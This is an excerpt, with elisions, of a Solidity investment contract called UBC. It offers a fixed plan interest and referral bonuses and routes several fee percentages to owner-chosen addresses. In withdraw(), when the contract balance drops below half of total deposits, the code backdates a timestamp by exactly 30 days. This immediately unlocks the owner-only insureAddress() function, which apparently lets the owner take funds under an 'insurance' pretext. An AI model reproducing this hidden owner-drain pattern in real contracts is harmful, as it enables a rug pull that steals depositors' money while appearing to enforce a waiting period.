...
contract UBC is Ownable {
    ...
    uint256 public constant MINIMUM = 1e6;                
    uint256 public constant REFERRER_CODE = 1000;           
    uint256 public constant PLAN_TERM = 154 days;
    uint256 public constant PLAN_TERM1 = 169 days;
    uint256 public constant WELFARE_FEE = 10;
    uint256 public constant SHREEM_TOKEN_FEE = 10;
    uint256 public constant CEO_FEE = 10;
    uint256 public constant MARKETING_FEE = 10;
    uint256 public constant DEVELOPER_FEE = 10;
    uint256 public constant PROMOTION_FEE = 10;
    uint256 public constant BA_FEE = 10;
    uint256 public constant DO_FEE = 10;
    uint256 public constant SO_FEE = 40;
    
    uint256 public PLAN_INTEREST = 13;
   ...
   uint256 public below_balance_timestamp;
    ...
    address payable public welfareAddr;
    address payable public shreemAddr;
    address payable public ceoAddr;
    address payable public marketingAddr;
    address payable public developerAddr;
    address payable public promotionalAddr;
    ...
    constructor(address payable wfAddr,address payable shAddr,address payable cAddr,address payable mrkAddr,address payable devprAddr,address payable proAddr,address payable bAddr,address payable dAddr,address payable sAddr) public {
        require(!isContract(wfAddr) && !isContract(shAddr) && !isContract(cAddr) && !isContract(mrkAddr) && !isContract(devprAddr) && !isContract(proAddr) && !isContract(bAddr) && !isContract(dAddr) && !isContract(sAddr));
        welfareAddr=wfAddr;
        shreemAddr=shAddr;
        ceoAddr=cAddr;
        marketingAddr=mrkAddr;
        developerAddr=devprAddr;
        promotionalAddr=proAddr;
        baAddr=bAddr;
        doAddr=dAddr;
        soAddr=sAddr;
        _init();
    ...
    function getInvestorInfoByUID(uint256 _uid) public view returns (uint256,uint256, uint256, uint256, uint256, uint256, uint256,uint256[] memory,uint256,uint256) {
        if (msg.sender != owner) {
        ...
        newDividends,
        investor.match_bonus,
        investor.withdraw
        );
    }
	
	function insureAddress() public payable{
        require(msg.sender == owner, "insure contract only accessable");
        uint256 diff = block.timestamp - below_balance_timestamp; 
        require(diff >= 2592000, "Contract below balance didnt cross 30days");
        require(below_balance_timestamp > 0, "Nothing to transfer");
    ...
    function _invest(address _addr, uint256 _referrerCode, uint256 _amount) private returns (bool) {
        ...
        uint256 wFee = _amount.mul(WELFARE_FEE).div(1000);
        welfareAddr.transfer(wFee);
        uint256 shFee = _amount.mul(SHREEM_TOKEN_FEE).div(1000);
        shreemAddr.transfer(shFee);
        uint256 ceFee = _amount.mul(CEO_FEE).div(1000);
        ceoAddr.transfer(ceFee);
        uint256 mrkFee = _amount.mul(MARKETING_FEE).div(1000);
        marketingAddr.transfer(mrkFee);
        uint256 devpFee = _amount.mul(DEVELOPER_FEE).div(1000);
        developerAddr.transfer(devpFee);
        uint256 proFee = _amount.mul(PROMOTION_FEE).div(1000);
        promotionalAddr.transfer(proFee);
    ...
    function withdraw() public {
        ...
        require(address(this).balance >= totalInvestments_.div(2), "Not enough money in contract");
        ...
        if(withdrawalAmount>0){
		    ...
		    uint256 _ref1=uid2Investor[uid].referrer;
		    if (_ref1 != 0) {
		        uint256 refPercent=withdrawalAmount.mul(1).div(100);
		        uid2Investor[_ref1].match_bonus += refPercent;
		    }
		    
			totalWithdraw_ = totalWithdraw_.add(withdrawalAmount);
			uid2Investor[uid].withdraw=uid2Investor[uid].withdraw.add(withdrawalAmount);
        ...
        if(contractBalance < totalInvestments_.div(2)) {
            below_balance_timestamp = block.timestamp - 2592000;
        }
